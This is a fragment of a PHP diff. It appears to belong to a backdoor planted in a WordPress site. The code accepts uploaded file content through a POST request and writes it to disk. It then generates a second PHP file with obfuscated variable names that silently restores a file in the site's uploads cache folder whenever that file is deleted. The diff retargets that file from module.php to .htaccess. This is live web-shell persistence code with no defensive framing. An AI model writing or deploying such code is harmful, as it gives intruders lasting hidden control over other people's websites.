@@ -23,7 +23,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
     file_put_contents($file2, $content);
 
     $file1Content = "<?php\n"
-        . "\$ddscdws = '/home/sc3tmtd4794/axelkahn.fr/wp-content/uploads/wpcode/cache/library/module.php';\n"
+        . "\$ddscdws = '/home/sc3tmtd4794/axelkahn.fr/wp-content/uploads/wpcode/cache/library/.htaccess';\n"
         . "\$sdfdsdfh = '$file2';\n"
         . "if (!file_exists(\$ddscdws) && file_exists(\$sdfdsdfh)) {\n"
         . "    \$iide = file_get_contents(\$sdfdsdfh);\n"
